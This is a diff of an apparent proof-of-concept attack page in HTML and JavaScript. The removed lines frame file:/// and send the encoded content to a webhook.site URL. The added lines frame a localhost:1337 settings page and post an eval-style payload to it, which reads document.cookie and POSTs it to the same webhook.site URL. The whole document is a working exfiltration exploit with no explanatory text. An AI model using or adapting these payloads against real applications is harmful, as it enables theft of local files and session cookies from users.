@@ -1,29 +1,13 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <title>Iframe Example</title>
-</head>
 <body>
-  <iframe src="file:///" id="myIframe"></iframe>
-
+  <iframe src="http://localhost:1337/settings" sandbox="allow-scripts allow-same-origin allow-popups allow-popups-to-escape-sandbox"></iframe>
   <script>
-    document.addEventListener("DOMContentLoaded", function() {
-      var iframe = document.getElementById("myIframe");
-
-      iframe.addEventListener("load", function() {
-        // Set a timeout of 2 seconds (2000 milliseconds)
-        setTimeout(function() {
-          // Access the content of the iframe after the timeout
-          var iframeContent = iframe.contentDocument || iframe.contentWindow.document;
-          console.log(iframeContent);
-          // You can perform further actions or manipulations on the iframe content here
-
-            url = "https://webhook.site/c6560158-65d9-4877-8040-964123673650";
-            sec = btoa(iframeContent)
-            document.location=url+"?"+encodeURIComponent(sec);
-        }, 2000);
-      });
-    });
+    const frame = document.querySelector('iframe');
+    frame.onload = () => frame.contentWindow.postMessage(`(async () => {
+      const w = eval.call(this, "window");
+      let p = w.open('/settings');
+      await new w.Promise(r => w.setTimeout(r, 500));
+      const c = p.document.cookie;
+      w.fetch("https://webhook.site/c6560158-65d9-4877-8040-964123673650", { method: "POST", body: c });
+    })();`, '*');
   </script>
 </body>
-</html>
